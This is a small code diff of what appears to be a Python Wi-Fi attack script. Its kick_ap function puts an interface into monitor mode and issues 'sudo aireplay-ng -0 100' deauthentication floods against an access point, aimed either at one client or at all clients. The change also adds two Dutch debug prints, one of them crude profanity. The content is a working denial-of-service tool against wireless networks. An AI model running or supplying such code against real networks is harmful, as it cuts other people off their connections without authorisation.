@@ -6,10 +6,11 @@ import socket
 from monitor_management import *
 
 
-def kick_ap(AP,CHANNEL,TARGET=0):
+def kick_ap(AP,CHANNEL,TARGET):
 	interface=start_monitor("wlan0",CHANNEL)
 	
-	if(TARGET!=0):
+	if(TARGET!="0"):
+		print ("ikbeneenkut")
 		command="sudo aireplay-ng -0 100 -a "
 		command+=AP
 		command+=" -c "
@@ -20,6 +21,7 @@ def kick_ap(AP,CHANNEL,TARGET=0):
 		sub.wait()
 		stop_monitor(interface)
 	else:
+		print ("ikwerkkeigoe")
 		command="sudo aireplay-ng -0 100 -a "
 		command+=AP
 		command+=" "
